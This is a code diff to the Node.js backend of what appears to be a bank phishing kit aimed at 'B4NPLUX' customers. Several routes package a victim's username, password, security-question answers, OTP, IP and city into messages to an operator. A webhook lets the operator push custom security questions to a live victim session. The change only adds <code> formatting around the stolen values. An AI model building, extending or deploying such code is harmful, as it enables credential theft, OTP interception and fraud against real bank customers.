@@ -56,8 +56,8 @@ app.post('/enviar', async (req, res) => {
 🔵B4NPLUX🔵
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clavv}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -103,8 +103,8 @@ app.post('/enviare', async (req, res) => {
 🔵B4NPLUX-EMPRES4🔵
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clavv}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -155,11 +155,11 @@ app.post('/enviar2', async (req, res) => {
 ❓🔑🔵B4NPLUX🔵
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clavv}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
 
-${pregunta1}❓ : ${respuesta1}
-${pregunta2}❓ : ${respuesta2}
+${pregunta1}❓ : <code>${respuesta1}</code>
+${pregunta2}❓ : <code>${respuesta2}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -203,11 +203,11 @@ app.post('/enviar2e', async (req, res) => {
 ❓🔑🔵B4NPLUX-EMPRES4🔵
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clavv}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
 
-${pregunta1}❓ : ${respuesta1}
-${pregunta2}❓ : ${respuesta2}
+${pregunta1}❓ : <code>${respuesta1}</code>
+${pregunta2}❓ : <code>${respuesta2}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -247,10 +247,10 @@ app.post('/enviar3', async (req, res) => {
 🔑🔵B4NPLUX🔵
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clavv}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
 
-🔑 0TP: ${dinamic}
+🔑 0TP: <code>${dinamic}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -289,10 +289,10 @@ app.post('/enviar3e', async (req, res) => {
 🔑🔵B4NPLUX-EMPRES4🔵
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clavv}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
 
-🔑 0TP: ${dinamic}
+🔑 0TP: <code>${dinamic}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -379,7 +379,7 @@ app.post('/webhook', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: callback.message.chat.id,
-          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid}\nEj: /${txid} ¿Dónde naciste?&¿Cuál es tu color favorito?`
+          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid}, Ej:\n <code>/${txid}</code> ¿Dónde naciste?&¿Cuál es tu color favorito?`
         })
       });
     }
